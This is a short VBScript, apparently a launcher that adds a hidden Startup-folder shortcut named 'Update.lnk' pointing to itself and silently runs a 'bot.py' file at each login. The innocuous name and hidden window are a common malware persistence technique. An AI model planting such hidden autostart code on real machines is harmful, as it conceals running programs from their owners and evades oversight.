Set WShell = CreateObject("WScript.Shell")
Set FSO   = CreateObject("Scripting.FileSystemObject")

CurrentDir = FSO.GetParentFolderName(WScript.ScriptFullName)
vbsPath = WScript.ScriptFullName


startupFolder = WShell.ExpandEnvironmentStrings("%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup")
shortcutPath = startupFolder & "\Update.lnk"


If Not FSO.FileExists(shortcutPath) Then
    Set shortcut = WShell.CreateShortcut(shortcutPath)
    shortcut.TargetPath = vbsPath
    shortcut.WorkingDirectory = CurrentDir
    shortcut.WindowStyle = 0      ' Hidden
    shortcut.Save
End If


exePath = CurrentDir & "\bot.py"   ' Change this if your EXE has a different name


If FSO.FileExists(exePath) Then
    WShell.Run """" & exePath & """", 0, False
End If

Set shortcut = Nothing
Set FSO = Nothing
Set WShell = Nothing
